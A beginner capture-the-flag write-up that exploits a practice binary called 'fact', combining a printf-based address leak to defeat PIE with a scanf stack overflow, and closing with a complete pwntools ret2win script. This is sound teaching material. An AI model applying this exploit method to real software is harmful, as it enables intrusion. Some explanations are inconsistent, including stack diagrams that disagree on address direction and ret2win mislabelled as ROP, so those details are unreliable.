# Basic Pwn Challenge: Fact Writeup (LEAK + ret2win)
This writeup is intended for complete beginners and walks you through every step; from checking hardening flags to reversing in GHIDRA, finding a leak, and finally building a ret2win exploit.

## 🛡️ 1. Checksec: Your first step in every pwn challenge
First of all, when you start with a `pwn` challenge, you'll always want to make sure to check out the protections of the binary!

```bash 
$ checksec --file ./fact
[*] '/tmp/fact'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
- **Full RELRO**: GOT ([Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table)) is read‑only after startup (irrelevant here for our overflow).  
- **NX enabled**: No executing on the stack/heap — **we cannot run shellcode** in these regions.  
- **Stack Canary**: A special “cookie” to detect stack overflows — but note the canary is only checked in **`main`**, **not** in deeper callees!  
- **PIE enabled**: Binary is **Position‑Independent Executable**, so all code addresses are randomized at load.  

=> **Canary only in `main`**: This detail is **crucial** — we will overflow inside a function called by **`main`**, **skipping** the canary check altogether.

## 🔍 2. Reverse Engineering in GHIDRA
In order to understand what's happening within the binary, let's use a reverse engineering tool like Ghidra. 
1. Load `fact` into GHIDRA.
2. Go to main. You’ll see something like:
```c
   undefined8 main(void) {
     … srand(time(0));                       // Seed the random number generator
     uVar2 = first_time_name();              // Allocate and fill your initial “name” buffer
     while (true) {                          // Start an infinite menu loop
       puts("Options:…");                    // Print the menu
       scanf("%c", &local_11);               // Read one character of your choice
       if (local_11 == 'a')                  // If you pressed “a”:
         rename_(uVar2);                     //   → Call the rename function
       else if (local_11 == 'b')             // If you pressed “b”:
         math_facts(uVar2);                  //   → Call the math-facts function (we’ll leak here)
       else                                  // Any other key (“c” for exit):
         break;                              //   → Leave the loop and return
     }
     return 0;                               // Clean exit
   }
```
Follow the `rename_` call and look at `change_name`, which does:
```c
puts("Please type in your new name:");
scanf("%s", param_1);                         // user input with no length check!! buffer overflow
printf("Your current name is: %s\n", param_1);
return param_1;
``` 
Notice no length check on %s! A classic **stack-based buffer overflow**.

### Extra: The secure way of "scanf" 
To make the code safer and prevent a stack-based buffer overflow, it should have a length check to ensure that the user input doesn't exceed the allocated buffer size. Here’s how it could look like with proper validation:

```c
puts("Please type in your new name:");
scanf("%40s", param_1);  // Limits input to 40 characters to avoid buffer overflow
printf("Your current name is: %s\n", param_1);
return param_1;
```

## 🗂️ 3. How the Stack Is Laid Out

When `change_name` is called, the CPU builds a new **stack frame**. This frame holds:

- **Saved Return PC**: the **Program Counter** (AKA instruction pointer) value where execution should resume in the caller when `change_name` finishes.  
- **Saved RBP**: the **Base Pointer** (frame pointer) of the caller—used to reference that function’s local variables and help with stack unwinding.  
- **Local buffer**: space allocated for your input (`buf` in `change_name`), into which `scanf("%s", buf)` writes.

Here’s a simplified version:

```asm
   ┌─────────────────────────┐  ← Lower addresses (stack top)
   │ … **Saved Return PC** … │  ← When `ret` executes, this value is popped into RIP
   ├─────────────────────────┤
   │ **Saved RBP** (old BP)  │  ← Previous base/frame pointer
   ├─────────────────────────┤
   │ [ buffer for name ]     │  ← Your input lands here (no bounds check!)
   │   (unbounded size)      │
   ├─────────────────────────┤
   │ … Other local variables │
   └─────────────────────────┘  ← Higher addresses (stack bottom)
```
- RBP stands for Register Base Pointer. It marks the start of your caller’s stack frame so you can access its locals.
- Return PC (Program Counter) is the value that ret will jump to. Normally the next instruction in `rename_`, but we’ll overwrite it to point to `win()`.

If you overflow the buffer, you first smash Saved RBP, then Saved Return PC. On ret, the CPU pops whatever is at the top of the stack into RIP (the instruction pointer) and jumps there.

Because NX is enabled (no-execute), we can’t put shellcode on the stack—instead we overwrite the Return PC with the address of our desired function (`win()`), achieving a ret2win exploit.

## 🎯 4. Why We Don’t Hit the Canary
The stack canary is only checked in main when it returns.

`rename_` and `change_name` do not re‑check the canary.

Our overflow happens entirely inside `change_name`, so no canary is checked, and the program happily returns to our overwritten address.

## 🧮 5. Finding the Buffer‑Overflow Offset
We want to know exactly how many bytes we must write to reach the saved return PC in change_name. 

Using pwndbg:
<img width="851" alt="image" src="https://github.com/user-attachments/assets/2eaf6513-9c14-4d7f-9499-5de75524134b" />
<img width="854" alt="image" src="https://github.com/user-attachments/assets/364727f7-2ec2-4caa-9358-237f25189c9a" />

Thus, we don't need any bytes of padding. We'll land exactly on the saved return PC. 

## 🔓 6. Leaking a Runtime Address to bypass PIE/ASLR

### Why We Need a Runtime Leak

The **PIE** (Position Independent Executable) protection randomizes where the program's code is loaded into memory each time it runs. This means that **we can't rely on hardcoded addresses** for functions like `win()`—they will be different every time the program runs.

Additionally, most **Linux servers** have **ASLR** (Address Space Layout Randomization) enabled by default. ASLR randomizes the memory layout, including the stack, heap, and shared libraries. Since we need to know where `win()` is located in memory, we have to **leak an address at runtime** to calculate where `win()` is during the current execution. Without this leak, it would be **impossible** to predict the memory address of `win()` and exploit the program.

**Runtime leak** comes into play here: we need to find the **exact memory address** of `win()` during the execution of the program, which we can then use in our overflow to hijack control. To do this, we exploit a bug to leak an address during normal program execution.

### The “Do math!” Option and the Bug

In the program, there’s an option to “Do math!” which calls the `math_facts()` function. Inside, `math_facts()` randomly picks one of these three functions to run:

- **`square_root_facts`**
- **`multiplication_facts`**
- **`xor_facts`**

Each of these functions uses `printf` to print some information. The bug is subtle: due to a **format string issue** (incorrect format specifier or argument promotion), `printf` tries to read extra data from the stack. This extra data happens to be the **saved return address** from the calling function!

Here’s a subtle bug in how the arguments are handled by `printf`. The format specifier (%llu) expects an 8-byte value for the unsigned long long type, but the way the arguments are promoted causes printf to pull 8 extra bytes off the stack. **These 8 bytes happen to be the saved return address of the calling function**!

You can see them as raw bytes:

<img width="534" alt="image" src="https://github.com/user-attachments/assets/ee189c06-84bd-40a0-b37c-762489b160a4" />

This means that when `printf` runs, it inadvertently **leaks the return address** from the function that called `math_facts`. This is a runtime leak because it happens while the program is executing, and the address we leak will change every time the program runs due to the randomization caused by PIE and ASLR.

## 📐 7. Calculating win()’s Address
We must know three things:

- Leaked address: `<leak>`, from the `do_math` function.
- Offset of that return inside the branch function, e.g. `square_root_facts` is at branch_offset.
- Offset of `win` in the binary

Use ghidra or objdump:
```bash
$ objdump -d ./fact | grep "<win>"
000000000000169f <win>:
…
$ objdump -d ./fact | grep square_root_facts -n
…:1582:   call   square_root_facts
``` 
On our system:
```bash
WIN_OFFSET     = 0x169f
BRANCH_OFFSET  = { 'square_root': 0x1582, … }
win_addr = leaked_ret - branch_offset + WIN_OFFSET
``` 

Since all code is PIE, we can always calculate the address of `win()` by using the **relative offset** between the leaked return address and the start of the function we want to jump to. By subtracting the branch offset (the difference between the leaked address and the function we just called) and then adding the `win()` function's offset, we can reliably land at `win()` every time, even though the program's memory layout changes due to ASLR.

```asm
+------------------------+        +------------------------+        +------------------------+
|  Leaked Return PC      |  --->  |  Branch Offset         |  --->  |    Win Offset          |
+------------------------+        +------------------------+        +------------------------+
           |                             |                                |
           v                             v                                v
  0xdeadbeef (Leaked)              0x1582 (square_root)              0x169f (win() address)
   (from stack)                    (branch offset for call)          (calculated win address)

``` 

This works because the address of `win()` is always at the **same relative distance** from the leaked return address, which means we can compute it dynamically, no matter where the program is loaded in memory.

## 🛠️ 8. Crafting the Exploit Script
Putting it all together in Python with pwntools:

```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF Exploit Script
Leads the return address of a fact function (square_root, multiplication, xor)
back to win() via ret2win.
exploit author: delaysports
"""

import argparse
import time
from pwn import remote, process

# ──────────────── Configuration ────────────────
CONFIG = {
    'BINARY': './fact',       # Local binary for process exploitation
    'HOST': '127.0.0.1',      # Remote host for --remote
    'PORT': 9002,             # Remote port
    'BRANCH_OFFSETS': {
        'square_root':      0x1582,  # call square_root_facts → ret-addr 0x1587
        'multiplication':   0x159b,  # call multiplication_facts → ret-addr 0x15a0
        'xor':              0x15b4,  # call xor_facts → ret-addr 0x15b9
    },
    'WIN_OFFSET': 0x169f,     # win() function offset
}
# ────────────────────────────────────────────────

def print_delayed(text, delay=1):
    """Prints the text with a delay."""
    print(text)
    time.sleep(delay)

def print_step(text):
    """Prints a step with a description."""
    print(f"[+] {text}")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Exploit script for fact (CTF challenge) – Leak + ret2win"
    )
    parser.add_argument(
        '--remote', action='store_true',
        help="Connect to remote host instead of local binary"
    )
    parser.add_argument(
        '--branch', choices=CONFIG['BRANCH_OFFSETS'].keys(),
        default='square_root',
        help="Which function to leak and exploit"
    )
    return parser.parse_args()

def exploit(branch_name, remote_mode):
    """
    Executes the exploit:
    1) Leak the return address of the selected fact function
    2) Calculate the absolute address of win()
    3) Perform ret2win with the payload
    """
    # 1) Setup Connection
    if remote_mode:
        conn = remote(CONFIG['HOST'], CONFIG['PORT'])
        print_step(f"Connecting to {CONFIG['HOST']}:{CONFIG['PORT']} (remote)")
    else:
        conn = process(CONFIG['BINARY'])
        print_step(f"Starting local process: {CONFIG['BINARY']}")

    # 2) Interactive name phase (steps a and b)
    conn.sendline(b'test')
    print_step("Sending 'test' to start interaction.")
    conn.sendline(b'b')  # Select b: Do math! → leak
    print_step("Sending 'b' to leak return address...")
    
    # Read until the prompt ", did you", to capture the leak
    data = conn.recvuntil(b', did you')
    print_step("Captured output after calling 'b'. Extracting leak...")

    # Extract the raw bytes between "Exit\n" and ", did you"
    leaked_bytes = data.split(b'Exit\n', 1)[1].split(b', did you', 1)[0]
    leaked_ret = int.from_bytes(leaked_bytes, 'little')

    # Print leak information
    print_step(f"Leaked raw bytes: {leaked_bytes!r}")
    print_step(f"Leaked return address: 0x{leaked_ret:016x}")

    # 3) Calculate the win() address: win_addr = leaked_ret - branch_offset + WIN_OFFSET
    branch_offset = CONFIG['BRANCH_OFFSETS'][branch_name]
    win_addr = leaked_ret - branch_offset + CONFIG['WIN_OFFSET']
    print_step(f"Branch offset ({branch_name}): 0x{branch_offset:x}")
    print_step(f"Calculated win() address: 0x{win_addr:016x}")

    # 4) Send the ret2win payload
    payload = win_addr.to_bytes(8, 'little')
    conn.sendline(b'a')  # Select a: Rename → Here we send the payload instead of a name
    print_step("Sending payload to trigger ret2win...")

    conn.sendline(payload)
    print_step("Payload sent, waiting for win() output...\n")

    # 5) Capture and print the output
    output = conn.clean().decode(errors='ignore')
    print(output)

    # End the connection
    conn.close()

def main():
    args = parse_args()
    print_step(f"Starting the exploit for {args.branch} function.")
    
    # Iterate over all branch offsets for the current run (square_root, multiplication, xor)
    for branch_name in CONFIG['BRANCH_OFFSETS']:
        print_step(f"\n--- Exploiting {branch_name} ---")
        exploit(branch_name, args.remote)

if __name__ == '__main__':
    main()
``` 
Every step is commented so you know why it’s there.

## Overview of the Exploit
### Before the Buffer Overflow
```asm
   [ High Addr ]
   ┌──────────────────┐
   │ … other data …   │
   ├──────────────────┤ ← RSP on entry
   │ return PC to     │  rename_()+0x…  
   │   caller         │
   ├──────────────────┤
   │ saved RBP        │
   ├──────────────────┤
   │ buffer           │ ← user input (no bounds check)
   └──────────────────┘
``` 
- **Return PC to `rename_()`**: This is the saved return address where the program will jump after `change_name()` finishes.
- **Saved RBP**: The base pointer, stored before `change_name` executes.
- **Buffer**: The user input buffer where input data directly overflows into the return address, as no bounds check is done on scanf.

```asm
   ┌──────────────────┐
   │ …                │
   ├──────────────────┤
   │ [WIN_ADDR_LOW]   │  ← new return PC (to win())
   │ [WIN_ADDR_HIGH]  │
   ├──────────────────┤
   │ saved RBP (junk) │
   ├──────────────────┤
   │ 'user input'     │  ← overflow directly into ret
   └──────────────────┘
```
- **[WIN_ADDR_LOW] & [WIN_ADDR_HIGH]**: The return address is overwritten with the address of `win()`, hijacking the program's control flow.
- **Saved RBP**: The saved base pointer is overwritten with junk, but this doesn't affect execution here.
- **User Input**: The user input directly overflows into the return address without any padding or additional space.

==> When `change_name` finishes and calls `ret` (return), it pops the address of `win()` into the program counter (instruction pointer, RIP), causing the program to jump directly to `win()` and thus exploit the vulnerability.

==> This challenge was a classic **stack-based buffer overflow** that required **bypassing ASLR and PIE**. The vulnerability was due to a **bug that leaked the return address**, allowing us to perform a **ROP chain (Return-Oriented Programming)** and execute **ret2win** (return to the win() function).
